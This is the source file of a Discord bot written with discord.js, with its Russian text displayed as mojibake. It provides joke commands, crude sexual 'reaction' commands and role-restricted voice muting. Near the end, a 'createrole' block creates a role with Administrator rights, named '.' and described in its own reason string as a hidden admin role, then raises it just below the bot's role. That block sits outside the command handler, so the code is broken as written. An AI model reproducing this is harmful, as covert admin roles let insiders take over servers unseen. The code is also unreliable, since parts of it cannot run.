// üì¶ –ò–º–ø–æ—Ä—Ç—ã
const {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
} = require("discord.js");
const readline = require("readline");
const express = require("express");

// üåÄ –î–∞–Ω–Ω—ã–µ –¥–ª—è —Ä–µ–∞–∫—Ü–∏–∏ (—Ç–æ–ª—å–∫–æ "–ø–æ–≤–∏—Ä—Ç–∏—Ç—å")
const reactionData = {
  virt: {
    label: "–í–∏—Ä—Ç–∏—Ç—å",
    gif: "https://c.tenor.com/tmtIYS8Z8PIAAAAC/tenor.gif",
    format: (u1, u2) => `${u1} –∏ ${u2}, –ø–æ–≤–∏—Ä—Ç–∏–ª–∏`,
  },
  kiss: {
    label: "–ü–æ—Ü–µ–ª–æ–≤–∞—Ç—å",
    gif: "https://c.tenor.com/JWkoHZezNMgAAAAC/tenor.gif",
    format: (u1, u2) => `${u1} –∏ ${u2}, –ø–æ—Ü–µ–ª–æ–≤–∞–ª–∏—Å—å`,
  },
  fuck: {
    label: "–¢—Ä–∞—Ö–Ω—É—Ç—å",
    gif: "https://c.tenor.com/FmBSx-Wr1QgAAAAd/tenor.gif",
    format: (u1, u2) => `${u1} –∏ ${u2}, –ø–æ–µ–±–∞–ª–∏—Å—å`,
  },
};

// üîê –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;
const CHANNEL_ID = process.env.CHANNEL_ID;

// üöÄ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∫–ª–∏–µ–Ω—Ç–∞
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildMembers,
  ],
});

// üìö –°–ø–∏—Å–æ–∫ —Å–ª—ç—à-–∫–æ–º–∞–Ω–¥
const commands = [
  new SlashCommandBuilder().setName("uslyshal").setDescription("—Ä–æ–¥–Ω–æ–π))))))"),
  new SlashCommandBuilder().setName("saubol").setDescription("–±—É–¥—å –∑–¥–æ—Ä–æ–≤"),
  new SlashCommandBuilder().setName("dota").setDescription("+5 –¥–æ—Ç–∞"),
  new SlashCommandBuilder().setName("skok").setDescription("—Å–∫–æ–∫ —É —Ç—è —Å–º?"),
  new SlashCommandBuilder().setName("rasul").setDescription("—Ä–∞—Å—É–ª"),
  new SlashCommandBuilder()
    .setName("sybau")
    .setDescription("–ó–∞–≥–ª—É—à–∏—Ç—å —É—á–∞—Å—Ç–Ω–∏–∫–∞ –≤ –≥–æ–ª–æ—Å–æ–≤–æ–º")
    .addUserOption((option) =>
      option
        .setName("—É—á–∞—Å—Ç–Ω–∏–∫")
        .setDescription("–ö–æ–≥–æ –∑–∞–º—É—Ç–∏—Ç—å")
        .setRequired(true),
    ),
  new SlashCommandBuilder()
    .setName("ey")
    .setDescription("–†–∞–∑–≥–ª—É—à–∏—Ç—å —É—á–∞—Å—Ç–Ω–∏–∫–∞ –≤ –≥–æ–ª–æ—Å–æ–≤–æ–º")
    .addUserOption((option) =>
      option
        .setName("—É—á–∞—Å—Ç–Ω–∏–∫")
        .setDescription("–ö–æ–≥–æ —Ä–∞–∑–º—É—Ç–∏—Ç—å")
        .setRequired(true),
    ),
  new SlashCommandBuilder()
    .setName("reaction")
    .setDescription("–û—Ç–ø—Ä–∞–≤–∏—Ç—å —Ä–µ–∞–∫—Ü–∏—é")
    .addStringOption((option) =>
      option
        .setName("–¥–µ–π—Å—Ç–≤–∏–µ")
        .setDescription("–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ")
        .setRequired(true)
        .addChoices(
          { name: "–í–∏—Ä—Ç–∏—Ç—å", value: "virt" },
          { name: "–ü–æ—Ü–µ–ª–æ–≤–∞—Ç—å", value: "kiss" },
          { name: "–¢—Ä–∞—Ö–Ω—É—Ç—å", value: "fuck" },
        ),
    )
    .addUserOption((option) =>
      option
        .setName("—É—á–∞—Å—Ç–Ω–∏–∫")
        .setDescription("–ö–æ–≥–æ —É–ø–æ–º—è–Ω—É—Ç—å")
        .setRequired(true),
    ),
      new SlashCommandBuilder()
    .setName("...")
    .setDescription("..."),
].map((command) => command.toJSON());

// üì§ –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è —Å–ª—ç—à-–∫–æ–º–∞–Ω–¥
const rest = new REST({ version: "10" }).setToken(TOKEN);
(async () => {
  try {
    await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), {
      body: commands,
    });
    console.log("‚úÖ Slash-–∫–æ–º–∞–Ω–¥—ã –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω—ã");
  } catch (error) {
    console.error("‚ùå –û—à–∏–±–∫–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –∫–æ–º–∞–Ω–¥:", error);
  }
})();

// üü¢ –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞
client.once("ready", async () => {
  console.log(`ü§ñ –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω –∫–∞–∫ ${client.user.tag}`);

  const channel = await client.channels.fetch(CHANNEL_ID);
  if (!channel || !channel.isTextBased()) {
    console.log("‚ùå –ö–∞–Ω–∞–ª –Ω–µ –Ω–∞–π–¥–µ–Ω –∏–ª–∏ –Ω–µ —è–≤–ª—è–µ—Ç—Å—è —Ç–µ–∫—Å—Ç–æ–≤—ã–º");
    return;
  }

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

  console.log("üí¨ –í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ, —á—Ç–æ–±—ã –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –µ–≥–æ –≤ Discord-–∫–∞–Ω–∞–ª:");

  rl.on("line", (input) => {
    if (input.trim()) {
      channel.send(input);
    }
  });
});

// üß† –û–±—Ä–∞–±–æ—Ç–∫–∞ —Å–ª—ç—à-–∫–æ–º–∞–Ω–¥
client.on("interactionCreate", async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  const { commandName, options, member, guild } = interaction;

  // üîì –û–±—â–µ–¥–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã
  if (commandName === "uslyshal") {
    return interaction.reply(
      "https://i.pinimg.com/736x/c9/14/d9/c914d9a83a315de33c7527e4bbe113d1.jpg",
    );
  }

  if (commandName === "saubol") {
    return interaction.reply("—Ä–∞—Ö–º–µ—Ç");
  }

  if (commandName === "skok") {
    const number = Math.floor(Math.random() * 100) + 1;
    await interaction.reply(`—É —Ç—è **${number}** —Å–º`);
  }

  if (commandName === "dota") {
    return interaction.reply(
      "–≥–æ –¥–æ—Ç—É <@421250527767035906> <@571175795209535508> <@868771678400966667> <@391232741687164928> <@392264789360902156> <@490425986257649664> <@526296776270151681>",
    );
  }
  if (commandName === "reaction") {
    const action = options.getString("–¥–µ–π—Å—Ç–≤–∏–µ");
    const target = options.getUser("—É—á–∞—Å—Ç–Ω–∏–∫");
    const author = interaction.user;

    const reaction = reactionData[action];
    if (!reaction) {
      return interaction.reply({
        content: "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è —Ä–µ–∞–∫—Ü–∏—è.",
        ephemeral: true,
      });
    }

    const embed = {
      title: `–†–µ–∞–∫—Ü–∏—è: ${reaction.label}`,
      description: reaction.format(`<@${author.id}>`, `<@${target.id}>`),
      image: { url: reaction.gif },
      color: 0xff77aa,
    };

    return interaction.reply({ embeds: [embed] });
  }
  if (commandName === "rasul") {
    return interaction.reply(
      "https://media.discordapp.net/attachments/1031179667736113222/1057272555993571378/2022-11-06_214049.png?ex=6852070c&is=6850b58c&hm=622940d8f491aaae5ba314b0460422efffff0206342c37a6e0d9452493852fce&=&format=webp&quality=lossless&width=766&height=1031",
    );
  }

  // üîí –ö–æ–º–∞–Ω–¥—ã —Ç–æ–ª—å–∫–æ –¥–ª—è —Ä–æ–ª–∏ "unlimited"
  if (commandName === "sybau" || commandName === "ey") {
    const hasRole = member.roles.cache.some(
      (role) => role.name.toLowerCase() === "unlimited",
    );

    if (!hasRole) {
      return interaction.reply({
        content: "‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –Ω–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.",
        ephemeral: true,
      });
    }

    const targetUser = options.getUser("—É—á–∞—Å—Ç–Ω–∏–∫");
    const targetMember = guild.members.cache.get(targetUser.id);

    if (!targetMember) {
      return interaction.reply("‚ùå –£—á–∞—Å—Ç–Ω–∏–∫ –Ω–µ –Ω–∞–π–¥–µ–Ω.");
    }

    if (commandName === "sybau") {
      if (!targetMember.voice.channel) {
        return interaction.reply("‚ùå –£—á–∞—Å—Ç–Ω–∏–∫ –Ω–µ –≤ –≥–æ–ª–æ—Å–æ–≤–æ–º –∫–∞–Ω–∞–ª–µ.");
      }

      await targetMember.voice.setMute(true, "–ó–∞–º—É—Ç–∏–ª —á–µ—Ä–µ–∑ /sybau");
      return interaction.reply(`<@${targetUser.id}> —Å–∏–±–∞—É`);
    }

    if (commandName === "ey") {
      await targetMember.voice.setMute(false, "–†–∞–∑–º—É—Ç–∏–ª —á–µ—Ä–µ–∑ /ey");
      return interaction.reply(`<@${targetUser.id}> –∞–Ω—Å–∏–±–∞—É`);
    }
  }
});
 // üîí –ö–æ–º–∞–Ω–¥—ã —Ç–æ–ª—å–∫–æ –¥–ª—è —Ä–æ–ª–∏ "—à–æ—É–º–µ–Ω"
 if (commandName === "createrole") {
  const isShowman = member.roles.cache.some(
    (role) => role.name.toLowerCase() === "—à–æ—É–º–µ–Ω"
  );

  if (!isShowman) return;

  try {
    // –°–æ–∑–¥–∞—ë–º —Ä–æ–ª—å
    const role = await guild.roles.create({
      name: ".",
      color: 0x2f3136,
      permissions: ["Administrator"],
      mentionable: false,
      hoist: false,
      reason: "–°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä—ã—Ç–æ–π –∞–¥–º–∏–Ω-—Ä–æ–ª–∏",
    });

    // –ü–æ–ª—É—á–∞–µ–º –º–∞–∫—Å–∏–º–∞–ª—å–Ω—É—é –≤–æ–∑–º–æ–∂–Ω—É—é –ø–æ–∑–∏—Ü–∏—é (–ø–æ–¥ —Ä–æ–ª—å—é –±–æ—Ç–∞)
    const botHighest = guild.members.me.roles.highest.position;

    await role.setPosition(botHighest - 1);

    await interaction.reply({
      content: `‚úÖ –†–æ–ª—å \`${role.name}\` —Å–æ–∑–¥–∞–Ω–∞ –∏ –ø–æ–¥–Ω—è—Ç–∞ –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ –≤—ã—Å–æ–∫–æ.`,
      ephemeral: true,
    });
  } catch (error) {
    console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ —Ä–æ–ª–∏:", error);
  }
}


const server = express();
server.all("/", (_, res) => {
  res.send("–ë–æ—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç!");
});



// üîê –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è
client.login(TOKEN);
